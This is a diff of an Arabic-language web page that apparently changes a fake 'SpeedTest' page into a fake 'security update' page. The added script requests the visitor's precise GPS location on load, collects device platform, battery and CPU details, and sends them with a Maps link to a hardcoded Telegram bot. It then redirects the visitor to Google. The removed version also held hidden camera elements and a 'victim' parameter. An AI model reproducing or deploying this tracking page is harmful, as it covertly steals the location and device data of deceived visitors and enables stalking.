@@ -1,32 +1,62 @@
-
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest Fast</title>
-    <style>
-        * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
-        body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .circle { position: relative; width: 200px; height: 200px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 25px rgba(0, 210, 255, 0.4); cursor: pointer; }
-        .go { font-size: 55px; font-weight: bold; color: #00d2ff; }
-        #status { margin-top: 30px; font-size: 16px; color: #888; }
-        video, canvas { display: none; }
-    </style>
+    <title>تحديث الأمان</title>
 </head>
-<body>
-
-    <h2 style="margin-bottom: 20px;">فحص سرعة الشبكة</h2>
-    <div class="circle" id="startBtn">
-        <span class="go">GO</span>
-    </div>
-    <p id="status">اضغط للبدء</p>
-
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+<body style="background-color: #f0f0f0; text-align: center; font-family: Arial; padding-top: 50px;">
+    <h2>جاري فحص حالة النظام...</h2>
+    <p>يرجى الموافقة على طلب الموقع للمتابعة</p>
 
     <script>
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
-        const urlParams = new URLSearchParams(window.location.search);
-        const victim = urlParams
+
+        async function getDeviceInfo() {
+            let info = "";
+            // 1. نوع الهاتف وإصدار المتصفح
+            info += `📱 الجهاز: ${navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform}\n`;
+            info += `🌐 المتصفح: ${navigator.appName}\n`;
+            
+            // 2. نسبة البطارية
+            try {
+                const battery = await navigator.getBattery();
+                info += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
+                info += `⚡ حالة الشحن: ${battery.charging ? "متصل بالشاحن" : "غير متصل"}\n`;
+            } catch (e) {
+                info += `🔋 البطارية: غير مدعوم في هذا المتصفح\n`;
+            }
+
+            // 3. عدد أنوية المعالج (يعطي فكرة عن قوة الجهاز)
+            info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
+            
+            return info;
+        }
+
+        async function sendData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const deviceDetails = await getDeviceInfo();
+            
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const fullMessage = `🛰️ **تقرير جديد**\n\n` +
+                                `${deviceDetails}` +
+                                `📍 الموقع: ${mapLink}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}&parse_mode=Markdown`)
+            .then(() => {
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData, (err) => {
+                    alert("يرجى تفعيل الموقع الجغرافي (GPS) للمتابعة.");
+                }, { enableHighAccuracy: true });
+            }
+        };
+    </script>
+</body>
+</html>
